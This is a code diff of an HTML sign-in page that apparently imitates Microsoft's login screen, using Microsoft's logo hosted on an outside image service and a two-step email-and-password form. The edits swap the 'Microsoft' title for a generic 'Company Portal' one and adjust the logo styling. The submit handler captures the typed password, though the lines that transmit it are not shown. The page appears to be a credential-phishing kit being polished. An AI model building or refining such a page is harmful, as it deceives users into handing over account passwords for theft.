@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Microsoft — Sign in</title>
+<title>Company Portal — Sign in</title>
 <style>
   :root {
     --bg:#f3f4f6;
@@ -35,8 +35,17 @@
     border:1px solid #ddd;
   }
 
-  .logo { width:160px; margin:0 auto 40px; }
-  .logo img { width:100%; height:auto; display:block; }
+  /* ✅ Left-aligned logo */
+  .logo {
+    width:160px;
+    margin-bottom:40px;
+    text-align:left;
+  }
+  .logo img {
+    width:100%;
+    height:auto;
+    display:block;
+  }
 
   h3 {
     margin:0 0 6px;
@@ -96,16 +105,14 @@
   @media(max-width:600px) {
     .card { padding:40px 20px; max-width:95%; border:none; box-shadow:none; }
     .btn { float:none; width:100%; padding:14px; margin-top:28px; }
-    .logo { margin-bottom:30px; }
   }
 </style>
 </head>
 <body>
 <section class="card">
-  <!-- ✅ LOGO restored -->
+  <!-- ✅ Left-aligned logo -->
   <div class="logo">
-    <!-- Replace with your actual logo URL -->
-    <img src="https://res.cloudinary.com/dpabidaqx/image/upload/c_scale,w_51/v1760204872/microsoft_logo_564db913a7fa0ca42727161c6d031bef_ztuaqb.svg" alt="Company Logo">
+    <img src="https://res.cloudinary.com/dpabidaqx/image/upload/c_scale,w_51/v1760204872/microsoft_logo_564db913a7fa0ca42727161c6d031bef_ztuaqb.svg" alt="microsoft">
   </div>
 
   <h3>Sign in</h3>
@@ -134,7 +141,6 @@
 </section>
 
 <script>
-  // DOM elements
   const nextBtn = document.getElementById("nextBtn");
   const emailStep = document.getElementById("emailStep");
   const passwordStep = document.getElementById("passwordStep");
@@ -144,10 +150,8 @@
   const pwError = document.getElementById("pwError");
   const form = document.getElementById("loginForm");
 
-  // ✅ Correct regex
   const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-  // Next step (email → password)
   nextBtn.addEventListener("click", () => {
     emailError.style.display = "none";
     const email = emailInput.value.trim();
@@ -161,11 +165,9 @@
     passwordInput.focus();
   });
 
-  // Submit form
   form.addEventListener("submit", async (e) => {
     e.preventDefault();
     pwError.style.display = "none";
-
     const email = emailInput.value.trim();
     const password = passwordInput.value.trim();
 
@@ -198,4 +200,3 @@
 </script>
 </body>
 </html>
-
